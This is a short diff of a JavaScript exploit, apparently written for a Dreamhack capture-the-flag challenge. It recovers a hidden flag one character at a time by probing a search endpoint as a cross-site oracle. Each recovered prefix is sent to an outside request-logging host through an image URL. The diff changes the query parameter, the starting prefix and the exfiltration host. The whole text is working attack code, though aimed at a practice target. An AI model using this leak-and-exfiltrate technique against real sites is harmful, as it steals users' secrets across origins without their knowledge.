@@ -29,7 +29,7 @@
     async function search(query) {
         try {
             await req(
-              `https://host3.dreamhack.games:9962/search?query=${query}`
+              `https://host3.dreamhack.games:9962/search?keyword=${query}`
             );
             return true;
         } catch (e) {
@@ -38,12 +38,12 @@
     }
     async function exploit() {
         let chars = "0123456789abcdef}"
-        let secret = "DH{";
+        let secret = "";
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://xojxvht.request.dreamhack.games/${secret}`;
+                    img.src = `https://uqksfhz.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
